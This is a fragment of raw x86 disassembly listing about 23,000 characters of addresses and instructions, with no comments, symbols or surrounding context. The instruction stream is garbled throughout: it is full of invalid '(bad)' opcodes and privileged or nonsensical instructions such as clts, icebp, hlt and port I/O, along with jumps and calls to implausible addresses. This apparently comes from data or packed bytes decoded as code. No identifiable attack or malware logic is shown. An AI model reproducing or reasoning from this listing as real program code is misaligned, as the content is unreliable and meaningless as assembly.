  427d8d:	ret    0x45
  427d90:	mov    ecx,DWORD PTR [ebx-0x7241ae04]
  427d96:	xchg   eax,edi
  427d98:	mov    DWORD PTR [ebp-0x75],ecx
  427d9b:	push   esi
  427d9c:	clc    
  427d9d:	jne    0x427d6f
  427d9f:	mov    ecx,0xf8450b0b
  427da4:	(bad)  
  427da5:	push   cs
  427da6:	or     BYTE PTR [ebp-0x3a],dh
  427da9:	cmp    eax,DWORD PTR [ecx]
  427dab:	pop    esi
  427dac:	(bad)  
  427dad:	or     al,0x5
  427daf:	inc    eax
  427db0:	leave  
  427db1:	in     al,dx
  427db2:	add    al,0x42
  427db4:	push   esi
  427db5:	and    eax,0xedc940cf
  427dba:	inc    DWORD PTR [eax-0x75]
  427dbd:	fmul   QWORD PTR [ebx-0xf8739be]
  427dc3:	inc    eax
  427dc4:	nop
  427dc5:	jmp    0x518b:0x8b8bc3ff
  427dcc:	(bad)  
  427dcd:	lea    eax,ds:0xff45e8f8
  427dd3:	push   esi
  427dd4:	push   DWORD PTR [ebp-0x39]
  427dd7:	mov    eax,0x7edda46
  427ddc:	or     al,0x6
  427dde:	push   DWORD PTR [ebp-0x3a]
  427de1:	cmp    eax,DWORD PTR [edx]
  427de3:	pop    esi
  427de4:	ret    
  427de5:	or     al,0x56
  427de7:	inc    ecx
  427de8:	push   ebp
  427de9:	js     0x427dd7
  427deb:	inc    edx
  427dec:	inc    ebp
  427ded:	int    0x1
  427def:	inc    ecx
  427df0:	sub    BYTE PTR ds:0xe77541fc,ah
  427df6:	add    DWORD PTR [edx+0x1c],eax
  427df9:	int3   
  427dfa:	mov    eax,ebx
  427dfc:	adc    al,0x8b
  427dfe:	xchg   edx,eax
  427dff:	push   ecx
  427e00:	mov    cl,BYTE PTR [ebp+0x45c8f8fe]
  427e06:	rcl    DWORD PTR [esi-0x9],cl
  427e09:	jne    0x427e5b
  427e0b:	mov    eax,0x7c80ece
  427e10:	rol    DWORD PTR [esi],cl
  427e12:	div    DWORD PTR [ebp+0x50]
  427e15:	cmp    ecx,edx
  427e17:	pop    esi
  427e18:	dec    BYTE PTR [edx]
  427e1a:	in     al,dx
  427e1b:	inc    edx
  427e1c:	sub    ebp,ecx
  427e1e:	inc    eax
  427e1f:	(bad)  
  427e20:	push   eax
  427e21:	add    edx,DWORD PTR [eax-0x17]
  427e24:	push   edi
  427e25:	add    dh,dh
  427e27:	leave  
  427e28:	adc    DWORD PTR [ebp-0x1],0xffffffec
  427e2c:	add    BYTE PTR [ecx+0x0],dl
  427e2f:	inc    ebp
  427e30:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  427e36:	add    BYTE PTR [eax-0x7fbf448],bh
  427e3c:	add    al,0x2
  427e3e:	jmp    0x57e2998
  427e43:	jne    0x427e2d
  427e45:	mov    eax,DWORD PTR [edx]
  427e47:	or     BYTE PTR [eax],al
  427e49:	inc    ecx
  427e4a:	stc    
  427e4b:	in     eax,dx
  427e4c:	ss inc eax
  427e4e:	aas    
  427e4f:	out    0x7d,eax
  427e51:	inc    ecx
  427e52:	mov    esi,ecx
  427e54:	lock ret 0x7d
  427e58:	and    ecx,DWORD PTR [ebx-0x171777]
  427e5e:	add    bh,bh
  427e60:	aad    0xd7
  427e62:	add    dh,cl
  427e64:	clts   
  427e66:	(bad)  
  427e67:	call   0xffcd7d6c
  427e6c:	hlt    
  427e6d:	iret   
  427e6e:	jge    0x427e46
  427e70:	rol    DWORD PTR [esi-0x80],cl
  427e73:	icebp  
  427e74:	or     BYTE PTR [edi-0x27],cl
  427e77:	(bad)  
  427e78:	out    dx,al
  427e79:	mov    eax,DWORD PTR [ebx]
  427e7b:	(bad)  
  427e7c:	pop    esi
  427e7d:	push   es
  427e7e:	cmp    al,0xe8
  427e80:	sar    edi,0x8
  427e83:	inc    DWORD PTR [edi]
  427e85:	inc    esi
  427e86:	(bad)  
  427e87:	jmp    0x8b00:0x530e577e
  427e8e:	push   esi
  427e8f:	mov    eax,DWORD PTR [eax]
  427e91:	and    al,0x0
  427e93:	inc    ebp
  427e94:	push   eax
  427e95:	push   eax
  427e96:	add    DWORD PTR [ebx+0x757d1834],ecx
  427e9c:	sub    edx,DWORD PTR [esi-0x24]
  427e9f:	jne    0x427e57
  427ea1:	lods   eax,DWORD PTR ds:[esi]
  427ea2:	mov    edx,DWORD PTR [edx-0x34]
  427ea5:	dec    esi
  427ea6:	out    0x83,eax
  427ea8:	into   
  427ea9:	push   edi
  427eab:	loopne 0x427e7b
  427ead:	shr    BYTE PTR [edx+ecx*4+0x0],1
  427eb1:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  427eb8:	rol    DWORD PTR [edx],0x8
  427ebb:	mov    esp,ecx
  427ebd:	cmp    DWORD PTR [ebx],0xc
  427ec0:	mov    esi,0x5001c0
  427ec5:	push   eax
  427ec6:	push   cs
  427ec7:	push   eax
  427ec8:	(bad)  
  427ec9:	sub    edx,edi
  427ecb:	push   esi
  427ecc:	adc    al,0xcb
  427ece:	ins    DWORD PTR es:[edi],dx
  427ecf:	mov    eax,0x203e8
  427ed4:	add    al,ah
  427ed6:	ror    BYTE PTR [eax+0xc007c0],0xc0
  427edd:	add    dh,al
  427edf:	add    ah,ch
  427ee1:	rol    DWORD PTR [ebx-0x3595fb0d],1
  427ee7:	pop    ecx
  427ee8:	or     eax,ebx
  427eea:	cli    
  427eeb:	add    BYTE PTR [ecx-0x4e728d1e],dh
  427ef1:	lea    ebp,[ebx]
  427ef3:	mov    edx,DWORD PTR [edx-0x4]
  427ef6:	dec    ecx
  427ef7:	inc    ebp
  427ef8:	shr    BYTE PTR [ebx],0x4b
  427efb:	and    al,0x0
  427efd:	(bad)  
  427efe:	jne    0x427f45
  427f00:	pop    eax
  427f01:	mov    al,0x5a
  427f03:	call   0x1418162
  427f08:	and    al,0x85
  427f0a:	push   edx
  427f0b:	add    BYTE PTR [eax+eax*1+0x0],ah
  427f0f:	dec    ebp
  427f10:	mov    cl,0x23
  427f12:	jmp    0x427f00
  427f14:	mov    al,0xe7
  427f16:	call   0x1388204
  427f1b:	shr    DWORD PTR [eax+ebx*2],cl
  427f1e:	lock (bad) 
  427f20:	adc    eax,0x757f008d
  427f25:	out    0x58,eax
  427f27:	cmp    al,0x7
  427f29:	pop    edx
  427f2a:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  427f31:	push   ecx
  427f32:	cld    
  427f33:	mov    esi,0x3b0175
  427f38:	and    al,0xb0
  427f3a:	xor    BYTE PTR [edx+0x1],0x8b
  427f3e:	add    ah,bh
  427f40:	mov    edi,DWORD PTR [ebp-0x4]
  427f43:	psubsw mm7,QWORD PTR [edi]
  427f46:	add    DWORD PTR [ebp+0x0],ebp
  427f49:	rcr    eax,1
  427f4b:	mov    edi,ecx
  427f4d:	and    eax,DWORD PTR [eax]
  427f4f:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  427f55:	call   0x12f823e
  427f5a:	add    al,cl
  427f5c:	mov    ebp,esi
  427f5e:	aam    0x83
  427f60:	or     DWORD PTR [ecx],eax
  427f62:	jne    0x427f55
  427f64:	mov    eax,DWORD PTR [eax]
  427f66:	aam    0x0
  427f68:	dec    ebp
  427f69:	jne    0x427ef6
  427f6b:	cmp    ebx,eax
  427f6d:	jb     0x427fbc
  427f6f:	jmp    0x427efc
  427f71:	mov    ebx,esp
  427f73:	int3   
  427f74:	dec    ebp
  427f75:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  427f7c:	mov    edx,0x8b0a8b
  427f81:	cmp    ecx,DWORD PTR [eax]
  427f83:	jb     0x427f5c
  427f85:	pop    edx
  427f86:	push   edi
  427f87:	cli    
  427f88:	pop    es
  427f89:	mov    eax,ecx
  427f8b:	jb     0x427f8f
  427f8d:	add    DWORD PTR [ebx],0xa
  427f90:	mov    eax,DWORD PTR [ebx]
  427f92:	int3   
  427f93:	add    bh,BYTE PTR [esi+0x75d10006]
  427f99:	jmp    0x427f26
  427f9b:	mov    al,0xe8
  427f9d:	call   0x103821f
  427fa2:	add    edx,DWORD PTR [ecx+ecx*8]
  427fa5:	pop    edi
  427fa6:	or     BYTE PTR [ecx-0x73],bl
  427fa9:	pop    ecx
  427faa:	inc    edi
  427fab:	xor    al,0xeb
  427fad:	push   ecx
  427fae:	mov    edi,DWORD PTR [edx+0xc506cc]
  427fb4:	call   0xb180b9
  427fb9:	int3   
  427fba:	sbb    BYTE PTR [esi],ch
  427fbc:	inc    ebp
  427fbd:	add    BYTE PTR [ebx-0x1f4f338b],cl
  427fc3:	call   0x9b8232
  427fc8:	or     BYTE PTR [ebx-0x73],dl
  427fcb:	cmp    al,0x47
  427fcd:	mov    al,0x1
  427fcf:	jb     0x427fd1
  427fd1:	mov    al,0x10
  427fd3:	push   eax
  427fd4:	add    al,0x75
  427fd6:	add    BYTE PTR [ebx],ch
  427fd8:	add    ebx,esp
  427fda:	int3   
  427fdb:	jne    0x427fed
  427fdd:	movsx  edx,cl
  427fe0:	add    DWORD PTR [eax],eax
  427fe2:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  427fe9:	mov    gs,edi
  427feb:	add    BYTE PTR [eax-0x50],ch
  427fee:	add    al,ch
  427ff0:	mov    eax,DWORD PTR [ecx]
  427ff2:	sub    eax,DWORD PTR [eax]
  427ff4:	jb     0x42806b
  427ff6:	add    DWORD PTR [esp+eiz*8-0x50],esi
  427ffa:	jge    0x427fe4
  427ffc:	add    al,0x1
  427ffe:	add    DWORD PTR [eax],0x0
  428001:	jne    0x428003
  428003:	je     0x42804a
  428005:	mov    eax,DWORD PTR [edi]
  428007:	ror    BYTE PTR [ebp+0x4d],1
  42800a:	or     DWORD PTR [ecx+0x4d03d004],0x3
  428011:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  428017:	mov    DWORD PTR [ebx],ebp
  428019:	fadd   DWORD PTR [eax+0x75]
  42801c:	inc    eax
  42801d:	pop    eax
  42801e:	lea    ebx,[ecx+0x4f]
  428021:	push   0xb1000003
  428026:	out    dx,eax
  428027:	add    ebp,DWORD PTR [edx+edx*2]
  42802a:	add    BYTE PTR [ebx+ecx*4],bh
  42802d:	mov    ch,BYTE PTR [ebx]
  42802f:	jb     0x4280a3
  428031:	add    al,0x89
  428033:	push   eax
  428034:	call   0x842acda6
  428039:	add    DWORD PTR [eax+eax*1],eax
  42803c:	jae    0x428052
  42803e:	icebp  
  42803f:	inc    ebp
  428040:	mov    eax,DWORD PTR gs:[ecx]
  428043:	int3   
  428044:	out    dx,al
  428045:	loopne 0x428094
  428047:	sub    eax,DWORD PTR [edx]
  428049:	push   0xffffff83
  42804b:	pop    esi
  42804c:	push   cs
  42804d:	jl     0x428068
  42804f:	add    al,0xaf
  428051:	xor    eax,0x832b6d00
  428056:	mov    eax,DWORD PTR [edx]
  428058:	rcr    BYTE PTR [ebp+0x754500dc],cl
  42805e:	ror    DWORD PTR [ebx+0x7dc8e803],1
  428064:	inc    ebp
  428065:	shr    ebx,0x3
  428068:	or     DWORD PTR [eax],0x4
  42806b:	push   0xffffffa5
  42806d:	pop    esi
  42806e:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  428075:	jmp    0x4280d4
  428077:	mov    edi,0xff0272
  42807c:	fdivr  QWORD PTR [ebp+0x5d]
  42807f:	push   0x4e
  428081:	pop    ecx
  428082:	call   0x42c487
  428087:	mov    DWORD PTR [ebx],eax
  428089:	in     al,0xc8
  42808b:	rol    BYTE PTR [ebp-0x75],0xc1
  42808f:	call   0xac8270
  428094:	pop    esi
  428095:	enter  0xceff,0x8b
  428099:	repz mov ecx,DWORD PTR [ebp-0x34]
  42809d:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  4280a4:	je     0x4280a6
  4280a6:	or     DWORD PTR [ebx-0x74183b24],eax
  4280ac:	jne    0x428092
  4280ae:	jmp    0x4280a9
  4280b0:	push   DWORD PTR [edx-0x24]
  4280b3:	push   0x4d
  4280b5:	pop    ecx
  4280b6:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  4280ba:	jge    0x4280c2
  4280bc:	mov    eax,eax
  4280be:	sub    ebp,DWORD PTR [edx+0x24]
  4280c1:	pop    esi
  4280c2:	inc    ebp
  4280c3:	mov    esp,0x8b6077
  4280c8:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  4280ce:	lods   al,BYTE PTR ds:[esi]
  4280cf:	add    BYTE PTR [ebx],bh
  4280d1:	enter  0xce73,0x49
  4280d5:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  4280dd:	stc    
  4280de:	jge    0x428152
  4280e0:	jnp    0xdd42044f
  4280e6:	call   0xc581bc
  4280eb:	fadd   st(0),st
  4280ed:	dec    esi
  4280ee:	ins    BYTE PTR es:[edi],dx
  4280ef:	stc    
  4280f0:	cmp    al,0x73
  4280f2:	push   ebp
  4280f3:	mov    eax,0xf8028b
  4280f8:	jne    0x4280bb
  4280fa:	mov    esi,ecx
  4280fc:	mov    esp,DWORD PTR [ebp+0x2c]
  4280ff:	add    edi,DWORD PTR [ebp-0x24]
  428102:	sub    esp,eax
  428104:	and    al,0x45
  428106:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  42810c:	sbb    al,0xee
  42810e:	pop    esi
  42810f:	call   0x82813f
  428114:	fsubr  st,st(3)
  428116:	sti    
  428117:	add    BYTE PTR gs:[ecx],bh
  42811a:	add    eax,esp
  42811c:	add    DWORD PTR [esi],eax
  42811e:	rol    DWORD PTR [ebp+0x8],0x29
  428122:	mov    esp,eax
  428124:	clc    
  428125:	jne    0x42819c
  428127:	mov    eax,0x8b0673
  42812c:	loopne 0x428173
  42812e:	loopne 0x4280b9
  428130:	lods   al,BYTE PTR ds:[esi]
  428131:	int3   
  428132:	inc    ebp
  428133:	mov    DWORD PTR gs:[eax+edi*8],eax
  428137:	add    al,0xc3
  428139:	sub    ecx,DWORD PTR [ebp+0x47]
  42813c:	(bad)  
  42813e:	shr    BYTE PTR [ebp-0x1f],0xe8
  428142:	add    eax,DWORD PTR [eax]
  428144:	call   0x6444249
  428149:	add    esi,DWORD PTR [esi-0x3b2efc83]
  42814f:	dec    esi
  428150:	ins    DWORD PTR es:[edi],dx
  428151:	in     al,dx
  428152:	lea    eax,[eax]
  428154:	inc    ebp
  428155:	inc    ebp
  428156:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  42815c:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  428166:	and    al,0xdc
  428168:	ror    DWORD PTR [edx+0x24],0xf7
  42816c:	or     BYTE PTR [ebp+0x4c],dh
  42816f:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  428173:	stos   BYTE PTR es:[edi],al
  428174:	adc    edx,edi
  428176:	inc    esp
  428177:	add    edi,DWORD PTR [eax]
  428179:	jne    0x42815e
  42817b:	mov    DWORD PTR [eax-0x7449db04],ecx
  428181:	cmp    ecx,DWORD PTR [edi]
  428183:	sub    BYTE PTR [ebp-0x7e],dl
  428186:	sar    ebp,0xb
  428189:	jmp    FWORD PTR [edi+0x2400392a]
  42818f:	sub    esi,DWORD PTR [ebx-0x73]
  428192:	mov    esp,DWORD PTR [ecx+edi*4]
  428195:	mov    ecx,DWORD PTR [eax]
  428197:	and    BYTE PTR [eax],al
  428199:	jne    0x428165
  42819b:	sub    ebp,ecx
  42819d:	sbb    BYTE PTR [esi+0x32],ah
  4281a0:	dec    ebp
  4281a1:	push   ebp
  4281a2:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  4281a8:	ret    
  4281a9:	mov    edx,ebp
  4281ab:	leave  
  4281ac:	sub    DWORD PTR [esi+0x24],ebx
  4281af:	ret    0x2b
  4281b2:	pop    ax
  4281b4:	push   ebp
  4281b5:	rol    BYTE PTR [ebx],0xeb
  4281b8:	add    DWORD PTR [ecx+0x6c0001],0x40
  4281bf:	jb     0x428216
  4281c1:	ret    
  4281c2:	in     al,dx
  4281c3:	jecxz  0x428150
  4281c5:	push   esi
  4281c6:	xchg   esp,eax
  4281c7:	jne    0x4281c9
  4281c9:	cmp    edx,DWORD PTR [esi+0x1c]
  4281cc:	jne    0x4281b2
  4281ce:	mov    eax,DWORD PTR [ebp-0x77]
  4281d1:	ror    DWORD PTR [ebx+0x899408],0xe0
  4281d8:	mov    esi,DWORD PTR [ebp-0x75]
  4281db:	pop    esi
  4281dc:	nop
  4281dd:	mov    eax,DWORD PTR [eax]
  4281df:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  4281e5:	add    al,0x0
  4281e7:	inc    ebp
  4281e8:	mov    eax,DWORD PTR [ebx]
  4281ea:	mov    ebp,ebx
  4281ec:	cmp    al,0xf
  4281ee:	or     al,al
  4281f0:	inc    ebp
  4281f1:	inc    ebp
  4281f2:	cmp    BYTE PTR [ebx+0x6c8bc89c],cl
  4281f8:	cld    
  4281f9:	add    BYTE PTR [edi+0x506c16c0],dh
  4281ff:	add    BYTE PTR [ecx-0x5],dl
  428202:	add    eax,0x17200
  428207:	sbb    al,0x85
  428209:	dec    esp
  42820a:	je     0x428244
  42820c:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  428210:	add    BYTE PTR [ebx],bh
  428212:	(bad)  
  428213:	and    al,0x39
  428215:	jae    0x4281b3
  428217:	mov    cl,cl
  428219:	inc    DWORD PTR [esp]
  42821c:	push   ebp
  42821d:	shr    esp,0x8
  428220:	in     al,dx
  428221:	push   esp
  428222:	add    DWORD PTR [eax],esp
  428224:	add    bl,cl
  428226:	inc    ebp
  428227:	mov    bh,0x89
  428229:	add    ah,bh
  42822b:	jmp    0xca7b9175
  428230:	pushf  
  428231:	dec    esp
  428232:	mov    edx,0xf8178520
  428237:	fst    DWORD PTR [ebp+0x0]
  42823a:	mov    BYTE PTR [eax],0xc4
  42823d:	sub    edx,DWORD PTR [ebx-0x3f]
  428240:	inc    ebp
  428241:	add    eax,0xc601dc
  428246:	mov    al,0xc6
  428249:	ins    BYTE PTR es:[edi],dx
  42824a:	mov    DWORD PTR [eax+0x57],0x2e0545c1
  428251:	dec    esp
  428252:	jmp    DWORD PTR [eax]
  428254:	inc    ebp
  428255:	fnstcw WORD PTR [eax+0x29]
  428258:	test   BYTE PTR [eax],0xc5
  42825b:	rol    BYTE PTR [eax],0xc0
  42825e:	lea    ecx,[ebp-0x3cf0dbcb]
  428264:	sbb    BYTE PTR [ebx-0x75fcae0d],cl
  42826a:	inc    esi
  42826b:	add    DWORD PTR [eax],ebx
  42826d:	add    dh,bh
  42826f:	mov    esi,DWORD PTR [edx+0x8]
  428272:	(bad)  
  428273:	fdiv   QWORD PTR ss:[ecx]
  428276:	(bad)  
  428277:	mov    bl,ch
  428279:	add    esi,eax
  42827b:	add    dh,bl
  42827d:	or     esi,eax
  42827f:	mov    dl,0xdf
  428281:	add    esi,eax
  428283:	add    al,ah
  428285:	push   cs
  428286:	mov    BYTE PTR [edx+0xc601e1],0xe2
  42828d:	or     BYTE PTR [ebx],dh
  42828f:	dec    ecx
  428290:	lea    eax,[ebx]
  428292:	xor    eax,0x18fc0fc7
  428297:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428298:	repz clc 
  42829a:	add    eax,DWORD PTR [ebp+0x46]
  42829d:	prefetcht0 BYTE PTR [ecx-0x2]
  4282a1:	xor    eax,0x7c60872
  4282a6:	mov    esp,0xbd32c698
  4282ab:	pop    esi
  4282ac:	mov    cl,0xbe
  4282af:	or     al,0xc6
  4282b1:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  4282b8:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  4282bf:	add    dh,al
  4282c1:	mov    eax,ebx
  4282c3:	xor    DWORD PTR [ebx],0x35008dbc
  4282c9:	mov    ecx,DWORD PTR [edi]
  4282cb:	sbb    al,0x18
  4282cd:	inc    ebp
  4282ce:	xrelease mov DWORD PTR [ebx],0x188546f4
  4282d5:	clc    
  4282d6:	(bad)  
  4282d7:	cmp    BYTE PTR [edx-0x64],dh
  4282da:	lea    ecx,[ecx+0x45ffe838]
  4282e0:	mov    ecx,esp
  4282e2:	fadd   st,st(6)
  4282e4:	dec    ebp
  4282e5:	lds    edi,FWORD PTR [eax+0x7145fc56]
  4282eb:	out    0x1,eax
  4282ed:	inc    ebp
  4282ee:	lea    ebp,ds:0xc8ffc6ff
  4282f4:	enter  0xa33,0xc6
  4282f8:	push   ebp
  4282f9:	leave  
  4282fa:	(bad)  
  4282fb:	xor    edi,DWORD PTR [eax-0x7ff7a47]
  428301:	add    BYTE PTR [ebp+0x44],al
  428304:	mov    eax,esp
  428306:	mov    WORD PTR [esi+0x43398300],?
  42830c:	psubusw mm4,QWORD PTR [eax-0x78]
  428310:	add    BYTE PTR [ebx-0x1303f975],al
  428316:	add    BYTE PTR [ebp+0x1],0xf3
  42831a:	add    BYTE PTR [ebp+0x38],al
  42831d:	in     eax,dx
  42831e:	inc    ebp
  42831f:	inc    ebp
  428320:	mov    esp,ebx
  428322:	add    BYTE PTR [ebp+0x0],0xee
  428326:	mov    DWORD PTR [ebp-0x48],eax
  428329:	sub    eax,0x2e00454f
  42832e:	js     0x428375
  428330:	data16 js 0x4282b8
  428333:	idiv   bh
  428335:	inc    esp
  428336:	(bad)  
  428337:	fadd   st(7),st
  428339:	mov    dh,0x89
  42833b:	and    DWORD PTR [esi+0x43],0xffffffff
  42833f:	fld    DWORD PTR [ebx-0x767cc078]
  428345:	pop    es
  428346:	push   0x8d45ffec
  42834b:	in     eax,dx
  42834c:	inc    DWORD PTR [ebp-0x77]
  42834f:	loopne 0x4283bb
  428351:	inc    ebp
  428352:	jmp    esp
  428354:	add    DWORD PTR [ebp+0x11],0xfffffff1
  428358:	mov    DWORD PTR [ebp+0x6c],eax
  42835b:	(bad)  
  42835d:	inc    ebp
  42835e:	(bad)  
  42835f:	call   0xe7cbc870
  428364:	outs   dx,BYTE PTR ds:[esi]
  428365:	inc    ebp
  428366:	(bad)  
  428367:	js     0x4282ec
  428369:	div    BYTE PTR ds:0x70bc8944
  42836f:	mov    dh,0xff
  428371:	or     DWORD PTR [ebp-0x7626f5bd],0xffffff88
  428378:	jb     0x4282fd
  42837a:	dec    DWORD PTR [eax]
  42837c:	mov    ebp,esp
  42837e:	test   WORD PTR [ebp-0x1],ax
  428385:	inc    ebp
  428386:	ror    BYTE PTR [ebx-0x117a279a],0xff
  42838d:	adc    edi,edi
  42838f:	mov    ecx,esi
  428391:	mov    eax,DWORD PTR [eax]
  428393:	cmp    BYTE PTR [esi-0x1],ah
  428396:	test   DWORD PTR [ebx],edi
  428398:	push   DWORD PTR [ebp-0x1]
  42839b:	mov    DWORD PTR [esi-0x48],ebp
  42839e:	add    BYTE PTR [ebp+0x66],al
  4283a1:	jmp    0x428328
  4283a3:	pushf  
  4283a4:	dec    DWORD PTR [ebx-0x7f9c0301]
  4283aa:	add    BYTE PTR [ecx],al
  4283ac:	data16 add BYTE PTR [ebp-0x7a00c8],al
  4283b3:	add    al,al
  4283b5:	add    BYTE PTR [esi+0x45],ah
  4283b8:	test   DWORD PTR [ebx+0xff7cff],ecx
  4283be:	dec    esp
  4283bf:	mov    DWORD PTR [eax],eax
  4283c1:	mov    esp,DWORD PTR [esi-0x4]
  4283c4:	inc    ebp
  4283c5:	cmp    BYTE PTR [eax+0x4701],0x38
  4283cc:	mov    DWORD PTR [ecx-0x7e],esp
  4283cf:	add    BYTE PTR [edi-0x73],al
  4283d2:	push   0xffffffd1
  4283d4:	mov    WORD PTR [ebp+0x64],ax
  4283d8:	(bad)  
  4283d9:	call   eax
  4283db:	mov    esp,eax
  4283dd:	data16 icebp 
  4283df:	test   DWORD PTR [ebp-0x1],eax
  4283e2:	(bad)  
  4283e4:	out    0xc0,eax
  4283e6:	lea    esp,[esi-0x30]
  4283e9:	test   DWORD PTR [edx+0x43ff80ff],ecx
  4283ef:	inc    edi
  4283f0:	jmp    0x75ff:0x40858866
  4283f7:	dec    DWORD PTR [ebp-0x7a992f40]
  4283fd:	test   esi,edi
  4283ff:	(bad)  
  428400:	(bad)  
  428401:	inc    DWORD PTR [ebp-0x9901b9]
  428407:	test   DWORD PTR [ebx+0x50fff4ff],ecx
  42840d:	rcl    BYTE PTR [ecx+0x66],0x33
  428411:	test   DWORD PTR [ebx+0xff72ff],edi
  428417:	inc    edi
  428418:	ret    
  428419:	mov    ax,WORD PTR [ebp-0x3f0004]
  428420:	push   eax
  428421:	mov    DWORD PTR [ebp-0x77],0xff98748b
  428428:	add    BYTE PTR [ebx-0x764ff439],al
  42842e:	push   DWORD PTR [esi+0x1]
  428431:	inc    DWORD PTR [eax]
  428433:	mov    eax,0xff99ff
  428438:	or     BYTE PTR [ecx-0x7a87bb],cl
  42843e:	jne    0x4283f8
  428440:	add    DWORD PTR [edx-0x76edff72],0xff707a8d
  42844a:	mov    ecx,0xd74fb8
  42844f:	add    cl,al
  428451:	mov    DWORD PTR [ecx-0x3f007784],ecx
  428457:	or     DWORD PTR [ebx+0x558966ec],0x7e
  42845e:	(bad)  
  42845f:	push   ebp
  428461:	mov    eax,0x8c2789
  428466:	ret    0x6689
  428469:	adc    BYTE PTR [ebp+0x4c],0x8d
  42846d:	add    bl,bl
  42846f:	mov    WORD PTR [ebp-0x70],ax
  428473:	(bad)  
  428474:	ret    0x660d
  428477:	or     BYTE PTR [ebp-0x77],dl
  42847a:	lea    eax,[ecx+eiz*8-0x6b1276bb]
  428481:	in     al,0x89
  428483:	(bad)  
  428484:	xchg   esi,eax
  428485:	aam    0xcf
  428487:	call   0x45dafd15
  42848c:	dec    edx
  42848d:	pop    ecx
  42848e:	mov    edx,DWORD PTR [eax]
  428490:	repnz push bp
  428493:	or     BYTE PTR [ebx+0x5510663b],0x49
  42849a:	(bad)  
  42849b:	repnz xor eax,0xa0898945
  4284a1:	mov    ah,0x89
  4284a3:	jmp    DWORD PTR [edx+0x66b0418d]
  4284a9:	inc    DWORD PTR [ebp+0x50]
  4284ac:	add    DWORD PTR [ebp-0x5],0xffffffbe
  4284b0:	mov    DWORD PTR [eax],ecx
  4284b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4284b3:	pop    es
  4284b4:	inc    ecx
  4284b5:	(bad)  
  4284b6:	cbw    
  4284b8:	inc    ebp
  4284b9:	xor    ah,BYTE PTR [esi+0x3]
  4284bc:	dec    ebp
  4284bd:	push   eax
  4284be:	inc    bp
  4284c0:	jge    0x428445
  4284c2:	mov    esp,DWORD PTR [esi-0x18]
  4284c5:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  4284cb:	add    DWORD PTR [ebx],esi
  4284cd:	add    BYTE PTR [ebx],al
  4284cf:	test   DWORD PTR [ebx],esi
  4284d1:	(bad)  
  4284d2:	inc    WORD PTR [ebp+0x0]
  4284d6:	mov    eax,DWORD PTR [eax]
  4284d8:	call   0x88983c0d
  4284dd:	mov    esi,eax
  4284df:	clc    
  4284e0:	ret    
  4284e1:	rol    cl,0xa
  4284e4:	mov    DWORD PTR ds:0x7c0ec88,esi
  4284ea:	mov    edx,edi
  4284ec:	pushf  
  4284ed:	pop    es
  4284ee:	jmp    FWORD PTR [edx+0x66]
  4284f1:	add    BYTE PTR [ebp-0x990175],al
  4284f7:	inc    ebp
  4284f8:	test   DWORD PTR [ebx-0x2f000202],eax
  4284fe:	push   ebp
  4284ff:	mov    edi,eax
  428501:	mov    dh,BYTE PTR [eax+0x266ff51]
  428507:	push   ebp
  428508:	add    BYTE PTR [ebx-0x764b1777],al
  42850e:	dec    DWORD PTR [esi+0x661851e8]
  428514:	add    BYTE PTR [ebp-0x7b],dl
  428517:	cmp    esi,0xfffffffb
  42851a:	dec    DWORD PTR [ecx+0x51fe9285]
  428520:	jmp    DWORD PTR [esi-0x75]
  428523:	push   ebp
  428524:	hlt    
  428525:	data16 (bad) 
  428527:	dec    ebp
  428528:	ret    
  428529:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  42852f:	lea    edx,[eax-0x1]
  428532:	jne    0x428505
  428534:	dec    DWORD PTR [ecx-0x2f7a63f8]
  42853a:	dec    BYTE PTR [ecx+0x51559eff]
  428540:	mov    DWORD PTR [esi-0x4c],esp
  428543:	push   ebp
  428544:	jmp    DWORD PTR [esi-0x18]
  428547:	inc    ebp
  428548:	sbb    BYTE PTR [ebp-0x767ae500],cl
  42854e:	(bad)  
  42854f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428550:	inc    eax
  428552:	test   DWORD PTR [esi-0x2],esp
  428555:	inc    ebp
  428556:	dec    DWORD PTR [ebp-0x760bde75]
  42855c:	(bad)  
  42855d:	test   al,0xc3
  42855f:	mov    DWORD PTR [ebp-0x769b56],ecx
  428565:	lods   al,BYTE PTR ds:[esi]
  428566:	push   eax
  428567:	inc    ebp
  428568:	jne    0x428579
  42856a:	dec    DWORD PTR [ebp+0x8]
  42856d:	mov    eax,DWORD PTR [edi]
  42856f:	sbb    al,0x0
  428571:	(bad)  
  428572:	mov    eax,0xc14fc3
  428577:	mov    DWORD PTR [eax-0x64],edi
  42857a:	inc    bp
  42857c:	test   DWORD PTR [edi],ecx
  42857e:	dec    DWORD PTR [ebp-0x1]
  428581:	xor    eax,edi
  428583:	add    ecx,DWORD PTR [ecx-0x99bdcd]
  428589:	inc    ebp
  42858a:	xor    DWORD PTR [ebx],0x3f
  42858d:	mov    WORD PTR [ebp-0x1bc],ax
  428594:	lea    ecx,[ecx-0x767702]
  42859a:	inc    esi
  42859b:	(bad)  
  42859c:	call   FWORD PTR [ebp+ecx*4-0x3e72be01]
  4285a3:	pushf  
  4285a4:	rol    DWORD PTR [ebp-0x72019a],0xff
  4285ab:	add    bh,bh
  4285ad:	add    BYTE PTR [edi],cl
